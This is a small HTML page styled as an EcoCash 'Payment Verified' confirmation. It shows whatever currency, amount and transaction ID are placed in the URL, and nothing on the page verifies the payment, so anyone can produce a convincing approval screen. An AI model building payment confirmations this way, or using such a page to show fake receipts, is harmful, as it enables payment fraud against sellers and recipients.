<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EcoCash · Verified</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
<style>
  body { font-family: 'Poppins', sans-serif; background: #F8FAFC; min-height: 100vh;
         display: flex; align-items: center; justify-content: center; padding: 24px; margin: 0; color: #101828; }
  .wrap { max-width: 480px; width: 100%; background: #fff; border-radius: 24px; padding: 40px 28px;
          text-align: center; box-shadow: 0 20px 50px rgba(16,24,40,0.10); }
  .mark { font-weight: 800; font-size: 28px; margin-bottom: 24px; }
  .mark .eco { color: #0066A6; }
  .mark .cash { color: #E31E24; }
  .tick { width: 80px; height: 80px; border-radius: 50%; background: #00A651; color: #fff;
          display: inline-flex; align-items: center; justify-content: center; margin-bottom: 20px; }
  .tick svg { width: 40px; height: 40px; }
  .tick svg path { stroke: #fff; stroke-width: 3; stroke-linecap: round; stroke-linejoin: round; fill: none; }
  h1 { font-size: 22px; font-weight: 800; margin-bottom: 6px; }
  p { font-size: 13px; color: #667085; }
  .amt { font-size: 26px; font-weight: 800; color: #0066A6; margin: 18px 0 4px; }
  .tx { font-family: monospace; font-size: 12px; color: #667085; }
</style>
</head>
<body>
<div class="wrap">
  <div class="mark"><span class="eco">Eco</span><span class="cash">Cash</span></div>
  <div class="tick"><svg viewBox="0 0 24 24"><path d="M5 12.5l4.2 4.2L19 7"/></svg></div>
  <h1>Payment Verified</h1>
  <p>Your transaction has been approved.</p>
  <div class="amt"><span id="cur">USD</span> <span id="amt">0.00</span></div>
  <div class="tx" id="tx">—</div>
</div>
<script>
  const p = new URLSearchParams(location.search);
  document.getElementById('cur').textContent = p.get('cur') || 'USD';
  document.getElementById('amt').textContent = Number(p.get('am') || 0).toFixed(2);
  document.getElementById('tx').textContent = p.get('tx') || '';
</script>
</body>
</html>
